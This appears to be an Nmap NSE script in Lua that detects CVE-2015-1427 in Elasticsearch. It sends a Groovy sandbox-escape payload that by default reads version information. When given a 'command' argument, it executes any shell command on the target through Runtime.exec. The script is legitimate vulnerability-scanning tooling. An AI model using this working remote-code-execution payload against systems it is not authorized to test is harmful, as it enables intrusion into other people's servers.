local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local json = require "json"
local nmap = require "nmap"

description = [[
This script attempts to detect a vulnerability, CVE-2015-1427, which  allows attackers
 to leverage features of this API to gain unauthenticated remote code execution (RCE).

 Elasticsearch versions 1.3.0-1.3.7 and 1.4.0-1.4.2 have a vulnerability in the Groovy scripting engine.
 The vulnerability allows an attacker to construct Groovy scripts that escape the sandbox and execute shell
 commands as the user running the Elasticsearch Java VM.
 ]]

---
-- @args command Enter the shell comannd to be executed. The script outputs the Java
-- and Elasticsearch versions by default.
-- @args invasive If set to true then it creates an index if there are no indices.
--
-- @usage
-- nmap --script=http-vuln-cve2015-1427 --script-args command= 'ls' <targets>
--
--@output
-- | http-vuln-cve2015-1427:
-- |   VULNERABLE:
-- |   ElasticSearch CVE-2015-1427 RCE Exploit
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2015-1427
-- |     Risk factor: High  CVSS2: 7.5
-- |       The vulnerability allows an attacker to construct Groovy
-- |           scripts that escape the sandbox and execute shell commands as the user
-- |           running the Elasticsearch Java VM.
-- |     Exploit results:
-- |       ElasticSearch version: 1.3.7
-- |       Java version: 1.8.0_45
-- |     References:
-- |       http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html
-- |       https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
-- |       https://github.com/elastic/elasticsearch/issues/9655
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1427

author = {"Gyanendra Mishra", "Daniel Miller"}

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"vuln", "intrusive"}

portrule = shortport.port_or_service(9200, "http", "tcp")


local function parseResult(parsed)
  -- for commands that return printable results
  if parsed.hits.hits[1] and parsed.hits.hits[1].fields and parsed.hits.hits[1].fields.exploit[1] then
    return parsed.hits.hits[1].fields.exploit[1]
  end
  -- mkdir(etc) command seems to work but as it returns no result
  if parsed.hits.total > 0 then
    return "Likely vulnerable. Command entered gave no output to print. Use without command argument to ensure vulnerability."
  end
  return false
end

action = function(host, port)

  local command = stdnse.get_script_args(SCRIPT_NAME .. ".command")
  local invasive = stdnse.get_script_args(SCRIPT_NAME .. ".invasive")

  local payload = {
    size= 1,
    query= {
      match_all= {}
    },
    script_fields= {
      exploit= {
        lang= "groovy",
        -- This proves vulnerability because the fix was to prevent access to
        -- .class and .forName
        script= '"ElasticSearch version: "+\z
        java.lang.Math.class.forName("org.elasticsearch.Version").CURRENT+\z
        "\\n    Java version: "+\z
        java.lang.Math.class.forName("java.lang.System").getProperty("java.version")'
      }
    }
  }
  if command then
    payload.script_fields.exploit.script = string.format(
      'java.lang.Math.class.forName("java.util.Scanner").getConstructor(\z
      java.lang.Math.class.forName("java.io.InputStream")).newInstance(\z
      java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec(\z
      %s).getInputStream()).useDelimiter("highlyunusualstring").next()',
      json.generate(command))
  end

  local json_payload = json.generate(payload)

  local vuln_table = {
    title = "ElasticSearch CVE-2015-1427 RCE Exploit",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    references = {
      'http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html',
      'https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/',
      'https://github.com/elastic/elasticsearch/issues/9655'
    },
    IDS = {
      CVE = 'CVE-2015-1427'
    },
    scores = {
      CVSS2 =  '7.5'
    },
    description = [[The vulnerability allows an attacker to construct Groovy
    scripts that escape the sandbox and execute shell commands as the user
    running the Elasticsearch Java VM.]]
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  local cleanup = function() return end
  local nocache = {no_cache=true, bypass_cache=true}
  --lets check the elastic search version.
  local response = http.get(host, port, '/')
  if response.status == 200 and response.body then
    local status, parsed = json.parse(response.body)
    if not(status) then
      stdnse.debug1('Parsing JSON failed(version checking). Probably not running Elasticsearch')
      return nil
    else
      if parsed.version.number then
          --check if a vulnerable version is running
          if (tostring(parsed.version.number):find('1.3.[0-7]') or tostring(parsed.version.number):find('1.4.[0-2]')) then
            vuln_table.state = vulns.STATE.LIKELY_VULN
          end
          --help the version/service detection.
          port.version = {
            name = 'elasticsearch',
            name_confidence = 10,
            product = 'Elastic elasticsearch',
            version = tostring(parsed.version.number),
            service_tunnel = 'none',
            cpe = {'cpe:/a:elasticsearch:elasticsearch:' .. tostring(parsed.version.number)}
          }
          nmap.set_port_version(host,port,'hardmatched')
      else
        stdnse.debug1('Cant Be Elastic search as no version number present.')
        return nil
      end
    end
  else
    stdnse.debug1('Not Running Elastic Search.')
    return nil
  end

  -- check if it is indexed, if not create index
  response = http.get(host,port,'_cat/indices', nocache)
  if response.status ~= 200 then
    stdnse.debug1( "Couldnt fetch indices.")
    return report:make_output(vuln_table)
  elseif response.body == '' then
    if invasive then
      local rand = string.lower(stdnse.generate_random_string(8))
      cleanup = function()
        local r = http.generic_request(host, port, "DELETE", ("/%s"):format(rand))
        if r.status ~= 200 or not r.body:match('"acknowledged":true') then
          stdnse.debug1( "Could not delete index created by invasive script-arg")
        end
      end
      local data = { [rand] = rand }
      stdnse.debug1("Creating Index. 5 seconds wait.")
      response = http.put(host,port,('%s/%s/1'):format(rand, rand),nil,json.generate(data))
      if not(response.status == 201) then
        stdnse.debug1( "Didnt have any index. Creating index failed.")
        return report:make_output(vuln_table)
      end
      stdnse.sleep(5) -- search will not return results immediately
    else
      stdnse.debug1("Not Indexed. Try the invasive option ;)")
      return report:make_output(vuln_table)
    end
  end

  --execute the command

  local target = '_search'
  response = http.post(host, port, target ,nil ,nil ,(json_payload))

  if not(response.body) or not(response.status==200) then
    cleanup()
    return report:make_output(vuln_table)
  else
    local status,parsed = json.parse(response.body)
    if ( not(status) ) then
      stdnse.debug1("JSON not parsable.")
      cleanup()
      return report:make_output(vuln_table)
    end
    --if the parseResult function returns something then lets go ahead
    local results = parseResult(parsed)
    if results then
      vuln_table.state = vulns.STATE.EXPLOIT
      vuln_table.exploit_results = results
    end
  end

  cleanup()
  return report:make_output(vuln_table)
end
